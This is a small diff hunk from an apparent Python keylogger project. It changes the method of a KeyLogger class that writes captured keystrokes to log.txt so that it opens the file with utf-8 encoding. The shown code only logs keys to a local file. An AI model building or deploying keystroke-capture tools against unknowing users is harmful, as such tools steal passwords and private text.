@@ -83,7 +83,7 @@ class KeyLogger:
 
     def add_keys_to_log(self, keys):
         """Writes events to file."""
-        with open("log.txt", "w") as _LOG:  # Change directory as needed
+        with open("log.txt", "w", encoding="utf-8") as _LOG:  # Change directory as needed
             for key in self.keys:
                 key = str(key).replace("'", "")
                 _LOG.write(key)
